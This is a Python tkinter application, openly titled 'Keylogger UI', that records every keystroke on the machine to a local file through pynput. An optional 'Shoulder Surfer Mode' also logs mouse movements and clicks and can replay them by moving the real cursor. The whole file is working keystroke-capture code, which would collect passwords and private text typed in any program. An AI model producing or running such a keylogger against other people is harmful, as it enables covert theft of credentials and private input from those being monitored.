import tkinter as tk
from pynput import keyboard, mouse
import threading
import time
import random

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger UI")
        self.root.geometry("400x400")

        self.logging = False
        self.shoulder_surfer_mode = False
        self.key_listener = None
        self.mouse_listener = None
        self.mouse_controller = mouse.Controller()
        self.pause_mouse = False
        self.mistake_count = 0
        self.max_mistakes = random.randint(3, 5)  # Randomly decide 3-5 mistakes

        self.status_label = tk.Label(root, text="Status: OFF", fg="red")
        self.status_label.pack(pady=5)

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.play_button = tk.Button(root, text="Run Mouse Movements", command=self.play_mouse_movements)
        self.play_button.pack(pady=5)

        self.shoulder_button = tk.Button(root, text="Enable Shoulder Surfer Mode", command=self.toggle_shoulder_mode)
        self.shoulder_button.pack(pady=5)

        self.clear_button = tk.Button(root, text="Clear Logs", command=self.clear_logs)
        self.clear_button.pack(pady=5)

        self.log_text = tk.Text(root, height=10, width=50)
        self.log_text.pack(pady=5)

        self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press_pause)
        self.keyboard_listener.start()

    def update_log_display(self, text):
        self.log_text.insert(tk.END, text + "\n")
        self.log_text.see(tk.END)

    def on_key_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = f"[{key}]"

        # Shoulder surfer mode introduces mistakes for the first few tries
        if self.shoulder_surfer_mode and self.mistake_count < self.max_mistakes:
            key_str = random.choice("abcdefghijklmnopqrstuvwxyz1234567890")  # Random mistake
            self.mistake_count += 1  # Track mistakes made

        with open("keylog.txt", "a") as log_file:
            log_file.write(key_str)

        self.update_log_display(f"Key Pressed: {key_str}")

    def on_key_press_pause(self, key):
        if key == keyboard.KeyCode.from_char('.'):
            self.pause_mouse = not self.pause_mouse
            self.update_log_display("Mouse movement paused" if self.pause_mouse else "Mouse movement resumed")

    def on_mouse_move(self, x, y):
        if not self.shoulder_surfer_mode:  # Ignore mouse movement if Shoulder Surfer Mode is OFF
            return

        # Shoulder surfer mode may slightly alter logged coordinates for first few attempts
        if self.mistake_count < self.max_mistakes:
            x += random.randint(-5, 5)
            y += random.randint(-5, 5)
            self.mistake_count += 1

        log_entry = f"Mouse moved to ({x}, {y})"
        with open("mouse_log.txt", "a") as log_file:
            log_file.write(log_entry + "\n")
        self.update_log_display(log_entry)

    def on_mouse_click(self, x, y, button, pressed):
        if not self.shoulder_surfer_mode:  # Ignore mouse clicks if Shoulder Surfer Mode is OFF
            return

        action = "Pressed" if pressed else "Released"
        log_entry = f"Mouse {action} at ({x}, {y}) with {button}"
        with open("mouse_log.txt", "a") as log_file:
            log_file.write(log_entry + "\n")
        self.update_log_display(log_entry)

    def start_keylogger(self):
        if not self.logging:
            self.logging = True
            self.mistake_count = 0  # Reset mistakes for new session
            self.max_mistakes = random.randint(3, 5)  # Reset mistakes range
            self.status_label.config(text="Status: ON", fg="green")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

            self.key_listener = keyboard.Listener(on_press=self.on_key_press)
            self.key_thread = threading.Thread(target=self.key_listener.start)
            self.key_thread.start()

            self.mouse_listener = mouse.Listener(on_move=self.on_mouse_move, on_click=self.on_mouse_click)
            self.mouse_thread = threading.Thread(target=self.mouse_listener.start)
            self.mouse_thread.start()

    def stop_keylogger(self):
        if self.logging:
            self.logging = False
            self.status_label.config(text="Status: OFF", fg="red")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

            if self.key_listener:
                self.key_listener.stop()
                self.key_listener = None

            if self.mouse_listener:
                self.mouse_listener.stop()
                self.mouse_listener = None

    def play_mouse_movements(self):
        try:
            with open("mouse_log.txt", "r") as log_file:
                for line in log_file:
                    if "moved" in line or "Pressed" in line or "Released" in line:
                        parts = line.strip().split()
                        if "moved" in line:
                            x, y = int(parts[3][1:-1]), int(parts[4][:-1])
                            while self.pause_mouse:
                                time.sleep(0.1)
                            self.mouse_controller.position = (x, y)
                            self.update_log_display(f"Replaying movement to ({x}, {y})")
                        elif "Pressed" in line or "Released" in line:
                            x, y = int(parts[3][1:-1]), int(parts[4][:-1])
                            button = mouse.Button.left if "left" in parts[-1] else mouse.Button.right
                            action = self.mouse_controller.press if "Pressed" in line else self.mouse_controller.release
                            while self.pause_mouse:
                                time.sleep(0.1)
                            self.mouse_controller.position = (x, y)
                            action(button)
                            self.update_log_display(f"Replaying click {parts[0]} at ({x}, {y})")
                        time.sleep(0.05)
        except FileNotFoundError:
            self.update_log_display("No mouse movements recorded!")

    def clear_logs(self):
        open("keylog.txt", "w").close()
        open("mouse_log.txt", "w").close()
        self.update_log_display("Logs cleared!")

    def toggle_shoulder_mode(self):
        self.shoulder_surfer_mode = not self.shoulder_surfer_mode
        self.mistake_count = 0  # Reset mistake counter
        self.max_mistakes = random.randint(3, 5)  # Random mistakes limit
        if self.shoulder_surfer_mode:
            self.shoulder_button.config(text="Disable Shoulder Surfer Mode")
            self.update_log_display("Shoulder Surfer Mode ENABLED - Tracking Mouse Movements")
        else:
            self.shoulder_button.config(text="Enable Shoulder Surfer Mode")
            self.update_log_display("Shoulder Surfer Mode DISABLED - Mouse Tracking OFF")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
